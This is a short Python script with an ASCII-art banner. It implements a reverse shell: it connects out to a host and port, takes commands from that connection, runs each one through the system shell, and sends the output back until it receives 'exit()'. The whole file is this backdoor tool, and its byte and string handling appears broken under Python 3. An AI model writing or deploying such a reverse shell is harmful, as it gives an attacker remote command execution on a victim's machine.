#!/usr/bin/python3
print("""\n\n\n   _____   __  .__.__  .__               
  /  _  \_/  |_|__|  | |__|____    ____  
 /  /_\  \   __\  |  | |  \__  \  /    \ 
/    |    \  | |  |  |_|  |/ __ \|   |  \\
\____|__  /__| |__|____/__(____  /___|  /
        \/                     \/     \/ \n\n\n""")


import socket, subprocess as sp, sys

host = str("127.0.0.1")
port = int(8000)

conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
conn.connect((host, port))

while 1:
    command = str(conn.recv(1024))
    if command != "exit()":
        sh = sp.Popen(command, shell=True,
                      stdout = sp.PIPE,
                      stderr = sp.PIPE,
                      stdin = sp.PIPE)
        
        out, err = sh.communicate()
        result = str(out) + str (err)
        length = str(len(result)).zfill(16)
        conn.send(length + result)
    else:
        break

conn.close()